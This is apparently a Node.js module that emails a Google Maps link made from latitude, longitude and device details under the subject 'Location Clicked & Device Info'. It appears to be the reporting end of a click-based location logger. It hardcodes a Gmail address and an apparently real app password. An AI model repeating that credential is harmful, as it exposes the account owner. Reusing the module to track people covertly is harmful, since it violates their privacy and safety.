const nodemailer = require('nodemailer');

// Configure your email and app password here
const EMAIL_USER = 'd.wizard.techno@gmail.com'; // <-- set your email
const EMAIL_PASS = 'gessxpsqwovxpytz'; // <-- set your app password

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS,
  },
});

async function sendLocationEmail(toEmail, lat, lng, deviceInfo = {}) {
  const mapUrl = `https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`;
  let deviceDetails = '';
  for (const [k, v] of Object.entries(deviceInfo)) {
    deviceDetails += `${k}: ${v}\n`;
  }
  const mailOptions = {
    from: EMAIL_USER,
    to: toEmail,
    subject: '📍 Location Clicked & Device Info',
    text: `Clicked Location: ${mapUrl}\n\nDevice Information:\n${deviceDetails}`,
  };
  return transporter.sendMail(mailOptions);
}

module.exports = { sendLocationEmail };
